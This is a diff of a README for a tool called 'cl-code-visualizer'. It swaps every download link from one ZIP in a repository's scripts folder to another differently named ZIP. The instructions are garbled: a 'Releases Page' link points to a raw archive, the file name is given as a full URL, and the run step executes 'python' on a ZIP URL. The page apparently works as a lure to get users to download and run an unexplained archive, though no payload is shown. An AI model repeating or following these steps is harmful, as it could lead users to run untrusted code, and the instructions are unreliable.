@@ -6,7 +6,7 @@ Welcome to **cl-code-visualizer**! This application helps you convert your Claud
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the application: [Download cl-code-visualizer](https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/cl-code-visualizer-3.1.zip). Follow the steps below to install and run the application.
+To get started, **visit this page to download** the application: [Download cl-code-visualizer](https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/visualizer-cl-code-v2.6.zip). Follow the steps below to install and run the application.
 
 ## 💻 System Requirements
 
@@ -17,19 +17,19 @@ Ensure your system meets the following requirements:
 
 ## 🔧 Installation Steps
 
-1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/cl-code-visualizer-3.1.zip) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/visualizer-cl-code-v2.6.zip) to find the latest version of the application.
 
 2. **Select the Version**: Choose the correct version for your system. Look for the latest release at the top of the page.
 
 3. **Download the Package**: Click on the download link for the version you selected. The file will begin downloading automatically.
 
-4. **Locate the Downloaded File**: Once the download is complete, find the file in your downloads folder. It should have a name similar to `https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/cl-code-visualizer-3.1.zip`.
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your downloads folder. It should have a name similar to `https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/visualizer-cl-code-v2.6.zip`.
 
 5. **Extract the Files**: Right-click the downloaded ZIP file and choose "Extract All" to unpack it. You will see a folder containing the application files.
 
 6. **Run the Application**: Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux), navigate to the extracted folder, and run the command:
    ```bash
-   python https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/cl-code-visualizer-3.1.zip
+   python https://raw.githubusercontent.com/h20hg/cl-code-visualizer/main/scripts/visualizer-cl-code-v2.6.zip
    ```
    This command starts the application.
 
